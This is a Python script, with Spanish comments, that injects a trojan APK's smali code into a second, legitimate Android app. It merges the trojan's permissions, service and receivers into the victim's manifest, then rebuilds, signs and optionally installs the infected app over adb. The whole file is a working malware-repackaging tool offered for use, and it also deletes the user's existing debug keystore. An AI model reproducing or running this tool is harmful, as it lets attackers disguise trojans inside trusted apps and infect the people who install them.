#!/usr/bin/python

#almacena estrucuras de datos jerarquicas en memoria
import xml.etree.ElementTree as ET
#escritura de archivos 
import fileinput
#llamadas al sistema
from subprocess import call 
#facilita uso de argumentos
import argparse 
#funcionaldiades del SO
import os
#realizar operaciones con archivos
import shutil
#uso de variables del interprete
import sys
#busquedas en directorios
import glob


apktool = os.path.expanduser('~') + "/Documents/mixapk/apktool/apktool"
androidSdk= os.path.expanduser('~') + "/Documents/mixapk/Android/Sdk/"
#androidSdk= "/home/yeudiel/Android/Sdk/"



TempDirectory = '/tmp/MixApk/'

packageToInject = 'trojan.android.android_trojan.action'

apk1 = TempDirectory + 'apk1.apk'
apk2 = TempDirectory + 'apk2.apk'

apk1Directory = TempDirectory + 'apk1/'
apk2Directory = TempDirectory + 'apk2/'

apk1Manifest = apk1Directory + 'AndroidManifest.xml'
apk2Manifest = apk2Directory + 'AndroidManifest.xml'

apk1Smali = apk1Directory + 'smali/'
apk2Smali = apk2Directory + 'smali/'

apk2Dist = apk2Directory + 'dist/'
apk2DistApk = apk2Dist + 'apk2.apk'

class ParseArgs:
   
    def __init__(self):
	#Definiendo los argumentos y creando un apartado de ayuda 
        self.parser = argparse.ArgumentParser(description='ACTION')
        self.parser.add_argument('--apks', dest='apks', action='store', metavar=('ApkTroyano', 'APKaInfectar'), nargs=2,
                                 default=False,
                                 help='Especifica el APK Troyano y el APK a infectar')
        self.parser.add_argument('--adb', dest='adb', action='store_true',default=False,
                                 help='instala el APK final con adb')
        self.args = self.parser.parse_args()

    def getargs(self):
        return self.args


class ParseManifest:
    def __init__(self, manifest):
	#Resgistar prefijo de namespace --> (prefix,namespace)
	#el  namesoace android siempre esta en http://schemas.android.com/apk/res/android
        ET.register_namespace("android", "http://schemas.android.com/apk/res/android")
        self.file = manifest
	#parseo de mainfest (permisos)
        self.manifest = ET.parse(manifest)
        self.root = self.manifest.getroot()
	#busca la seccion application
        self.application = self.manifest.find('application')
        self.permissions = []
        self.services = []
        self.receiver = []
        self.nodePermissions = []
        self.nodeServices = []
        self.nodeReceiver = []
        self.mainactivity = None
        self.mainpackage = None

    def findMainActivity(self):
	#si mainactiity esta vacio, copia el mainactivity y le regresa
        if self.mainactivity is None:
            for child in self.root.iter('activity'):
                for child0 in child:
                    for child1 in child0:
                        if child1.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
                            self.mainactivity = child.get('{http://schemas.android.com/apk/res/android}name')
                            return self.mainactivity
        else:
            return self.mainactivity

    def findMainPackage(self, ):
        if self.mainpackage is None:
            self.mainpackage = self.root.get('package')
        return self.mainpackage

    def listPermissions(self):
        if len(self.permissions) == 0:
            for child in self.root.iter('uses-permission'):
                self.permissions.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.permissions

    def listService(self):
        if len(self.services) == 0:
            for child in self.root.iter('service'):
                self.services.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.services

    def listReceiver(self):
        if len(self.receiver) == 0:
            for child in self.root.iter('receiver'):
                self.receiver.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.receiver

    def listNodePermissions(self):
        if len(self.nodePermissions) == 0:
            for child in self.root.iter('uses-permission'):
                self.nodePermissions.append(child)
        return self.nodePermissions

    def listNodeService(self):
        if len(self.nodeServices) == 0:
            for child in self.root.iter('service'):
                self.nodeServices.append(child)
        return self.nodeServices

    def listNodeReceiver(self):
        if len(self.nodeReceiver) == 0:
            for child in self.root.iter('receiver'):
                self.nodeReceiver.append(child)
        return self.nodeReceiver


class EditManifest(ParseManifest):
    def __init__(self, manifest):
        ParseManifest.__init__(self, manifest=manifest)

    def write(self):
        self.manifest.write(self.file)

    def addService(self, node, mainpackage):
        if type(node) is list:
            for service in node:
                service.set('{http://schemas.android.com/apk/res/android}name',
                            service.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
                self.application.append(service)
        else:
            node.set('{http://schemas.android.com/apk/res/android}name',
                            node.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
            self.application.append(node)
        self.write()

    def addReceiver(self, node, mainpackage):
        if type(node) is list:
            for receiver in node:
                receiver.set('{http://schemas.android.com/apk/res/android}name',
                            receiver.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
                self.application.append(receiver)
        else:
            node.set('{http://schemas.android.com/apk/res/android}name',
                            node.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
            self.application.append(node)
        self.write()

    def addPermissions(self, node):
        if type(node) is list:
            for permission0 in node:
                change = True
                for permission1 in self.listPermissions():
                    if permission0.get('{http://schemas.android.com/apk/res/android}name') == permission1:
                        change = False
                if change:
                    self.root.append(permission0)
        else:
            for permission in self.listPermissions():
                if permission == node.get('{http://schemas.android.com/apk/res/android}name'):
                    return
            self.root.append(node)
        self.write()


def error(message, ex, code):
    print(message)
    if ex:
        print(ex)
    sys.exit(code)

def sed(file, old, new):
    for line in fileinput.input(file, inplace=True):
        print(line.replace(old, new))


if not os.path.exists(TempDirectory):
    os.makedirs(TempDirectory)

args = ParseArgs().getargs()

if not os.path.isfile(apktool):
    error("apktool no esta en la ruta: " + apktool, None, 1)

if not os.path.exists(androidSdk):
    error("android SDK no esta en la ruta: " + androidSdk, None, 1)

if args.apks and os.path.isfile(args.apks[0]) and os.path.isfile(args.apks[1]):
    try:
        shutil.copyfile(args.apks[0], apk1)
        shutil.copyfile(args.apks[1], apk2)
    except IOError as ex:
        error("No se pudieron copiar las apks a  " + TempDirectory, str(ex), 1)
else:
    error("Especifica dos Apks en la linea de comandos, Uso : mixapk.py apk1.apk apk2.apk", None, 2)


try:
    call(apktool + " d -v -f -o " + apk1Directory + " " + apk1, shell=True)
    call(apktool + " d -v -f -o " + apk2Directory + " " + apk2, shell=True)
except OSError as ex:
	#can't extract the two apk
    error("No se pudieron extraer las apks ", str(ex), 1)

ParseManifest1 = ParseManifest(manifest=apk1Manifest)
ParseManifest2 = ParseManifest(manifest=apk2Manifest)

EditManifest1 = EditManifest(manifest=apk1Manifest)
EditManifest2 = EditManifest(manifest=apk2Manifest)

apk1Action = apk1Smali + packageToInject.replace('.', '/') + '/'
apk2Action = apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'

shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/',
            apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')


for file in glob.glob(apk2Action + '*.smali'):
    sed(file, ParseManifest1.findMainPackage().replace('.', '/'), ParseManifest2.findMainPackage().replace('.', '/'))

EditManifest2.addPermissions(ParseManifest1.listNodePermissions())
EditManifest2.addService(ParseManifest1.listNodeService()[0], ParseManifest1.findMainPackage())
EditManifest2.addReceiver(ParseManifest1.listNodeReceiver(), ParseManifest1.findMainPackage())

try:
    call(apktool + " b -d -f " + apk2Directory, shell=True)
except OSError as ex:
    error("No se pudo compilar " + apk2Directory , str(ex), 1)


try:
    cd = os.getcwd()
    os.chdir(apk2Dist)

    if os.path.exists(apk2Dist + 'app-debug2.apk'):
        os.remove(apk2Dist + 'app-debug2.apk')
    if os.path.exists(apk2Dist + 'app-debug.apk'):
        os.remove(apk2Dist + 'app-debug.apk')
    if os.path.exists(cd + '/app-debug2.apk'):
        os.remove(cd + '/app-debug2.apk')
    if not os.path.exists(os.path.expanduser('~') + '/.android/'):
        os.makedirs(os.path.expanduser('~') + '/.android/') 
    if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
        os.remove(os.path.expanduser('~') + '/.android/debug.keystore')

    shutil.copyfile(apk2DistApk, apk2Dist + 'app-debug.apk')

    print(androidSdk + 'zipalign -v 4 app-debug.apk app-debug2.apk')

    call(androidSdk + 'zipalign -v 4 app-debug.apk app-debug2.apk', shell=True)
    call('keytool -genkey -v -keystore ~/.android/debug.keystore -alias sample -keyalg RSA -keysize 2048 -validity 20000', shell=True)
    call('jarsigner -verbose -keystore ~/.android/debug.keystore app-debug2.apk sample', shell=True)
    call('jarsigner -verify app-debug2.apk', shell=True)

    if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
        os.remove(os.path.expanduser('~') + '/.android/debug.keystore')

    if args.adb:
        call(androidSdk + '/platform-tools/adb install app-debug2.apk', shell=True)

    shutil.copyfile(apk2Dist + 'app-debug2.apk', cd + '/app-final.apk')
except OSError as ex:
    error("no se pudo compilar " + apk2Directory , str(ex), 1)

